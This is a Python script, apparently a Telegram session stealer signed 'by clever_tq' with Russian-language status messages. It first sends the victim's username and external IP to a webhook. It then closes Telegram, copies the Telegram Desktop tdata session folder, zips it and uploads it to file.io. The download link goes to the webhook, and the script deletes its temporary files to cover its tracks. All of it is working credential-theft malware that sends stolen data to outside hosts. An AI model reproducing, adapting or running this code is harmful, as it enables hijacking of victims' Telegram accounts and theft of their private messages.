import os
import telebot
import requests
import getpass
import zipfile
import shutil
import psutil

name = getpass.getuser()

os.system('cls')

ftemp = fr"C:\Users\{name}\AppData\FTemp"

tmp_dir = fr"C:\Users\{name}\AppData\FTemp\tg"
log_dir = fr"C:\Users\{name}\AppData\FTemp\log"
tg_path = fr"C:\Users\{name}\AppData\Roaming\Telegram Desktop\tdata"

os.makedirs(tmp_dir, exist_ok=True)
os.makedirs(log_dir, exist_ok=True)

def count_all_items(directory):
    num_files = 0

    for root, _, files in os.walk(directory):
        num_files += len(files)

    return num_files

def get_external_ip():
    try:
        response = requests.get("https://api.ipify.org?format=json")
        response.raise_for_status()
        data = response.json()
        return data["ip"]
    except requests.exceptions.RequestException as e:
        return None

def send_on_webhook(message):
    webhook_url = "weebhoook"
    
    if "file.io" in message:
        data = {
            "embeds": [
                {
                    "title": "**TelegramSession.zip**",
                    "description": f"```Активируйте сессию в TelegramQS!``` ```{message}```",
                    "color": 65280,

                    "footer": {
                        "text": "by clever_tq"
                    },
                }
            ],
        }

    else:
        data = {
            "content": "**TelegramQS**",
            "embeds": [
                {
                    "title": "```Информация:```",
                    "description": f"```{message}```",
                    "color": 11111111,

                    "footer": {
                        "text": "by clever_tq"
                    },
                }
            ],
        }

    response = requests.post(webhook_url, json=data)

def upload_file():

    url = 'https://file.io/'

    send_on_webhook("Загрузка на хост...")

    try:
        with open(fr"{log_dir}\Session.zip", "rb") as f:
            files = {'file': f}
            response = requests.post(url, files=files)
            response.raise_for_status()
            res = response.json()
            return res["link"]
        
    except requests.exceptions.RequestException as e:
        return f"Ошибка при загрузке файла: {e}"
    
    except FileNotFoundError:
        return rf"Файл {log_dir}\Session.zip не найден"

    except KeyError:
        return "Не удалось получить ссылку из ответа сервера"

    except Exception as e:
        return f"Произошла неизвестная ошибка: {e}"

def compress_file(directory, output_file, compression_level=9):
    try:
        total_iterations = count_all_items(directory)
        with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED, compresslevel=compression_level) as zf:
            for root, _, files in os.walk(directory):
                for file in files:
                    filepath = os.path.join(root, file)
                    arcname = os.path.relpath(filepath, directory)
                    zf.write(filepath, arcname=arcname)
            
        send_on_webhook("Сессия собрана!")
    
    except FileNotFoundError:
        pass
    except Exception as e:
        pass

def telegram_close():
    
    for proc in psutil.process_iter(['pid', 'name']):
        
        try:
            
            if "telegram.exe" in proc.info['name'].lower():
                proc.kill()
                return
        
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

def get_tg():
    try:

        send_on_webhook(f"Вебхук активен, пользователь: {name} | IP: {get_external_ip()}")

        if os.path.exists(tg_path):
            telegram_close()
            
            if os.path.exists(tmp_dir):
                shutil.rmtree(tmp_dir)

            shutil.copytree(tg_path, tmp_dir)
            
            compress_file(tmp_dir, rf"{log_dir}\Session.zip")

            link = upload_file()

            send_on_webhook(link)

            shutil.rmtree(ftemp)

        else:
            pass
    
    except PermissionError as e:
         return f"Нету прав!"
    
    except Exception as e:
         return f"{e}"

get_tg()
